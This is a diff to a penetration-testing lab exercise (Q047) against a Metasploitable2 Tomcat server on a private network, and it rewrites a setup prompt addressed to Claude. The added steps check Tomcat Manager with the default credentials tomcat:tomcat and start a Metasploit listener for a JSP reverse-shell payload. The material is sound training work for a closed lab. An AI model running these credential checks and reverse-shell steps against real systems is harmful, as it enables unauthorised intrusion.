@@ -5,7 +5,7 @@
 | **Target** | `192.168.52.129` / `192.168.52.130` |
 | **Domain** | 05 — System Hacking |
 | **Difficulty** | 🔴 Hard |
-| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
+| **Tools** | `msfvenom, curl` |
 | **Time budget** | 15–25 min |
 
 ---
@@ -66,9 +66,11 @@ Connecting to /shell/ triggers reverse shell.
 ## 🤖 Claude Setup Prompt (for Claude-on-your-PC)
 
 ```
-1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
-2. Required services for this Q already up by default on the relevant target.
-3. If something is down, restart it on the target VM.
+Pre-requisites for Q047:
+1. Verify Metasploitable2 (192.168.52.129) up; tomcat55 running (sudo service tomcat55 status).
+2. Confirm Tomcat Manager accessible: curl -u tomcat:tomcat http://192.168.52.129:8180/manager/html — 200 OK.
+3. Parrot: msfvenom available (part of metasploit-framework).
+4. Start a listener before deploy: msfconsole -q -x 'use multi/handler; set PAYLOAD java/jsp_shell_reverse_tcp; set LHOST 192.168.52.128; set LPORT 4444; run'.
 
-Report back: "Lab ready for Q047".
+Report back: "Lab ready for Q047 — Tomcat manager reachable on 192.168.52.129:8180 with tomcat/tomcat".
 ```
